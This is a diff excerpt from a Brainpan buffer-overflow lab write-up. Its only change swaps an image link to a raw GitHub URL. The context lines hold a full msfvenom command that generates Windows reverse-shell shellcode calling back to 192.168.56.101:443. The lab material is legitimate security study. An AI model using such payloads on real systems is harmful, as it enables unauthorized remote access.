@@ -152,7 +152,7 @@ Setting JMP ESP address and shellcode
 
 `msfvenom -p windows/shell_reverse_tcp lhost=192.168.56.101 lport 443 -f c -o shellcode.txt -b "\x00"`
 
-![](https://github.com/d15rup7or/Labs/blob/master/Brainpan/img/generating-shellcode.png?raw=true)
+![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/generating-shellcode.png)
 
 ## Conclusion and benefits
 It was an opportunity to improve
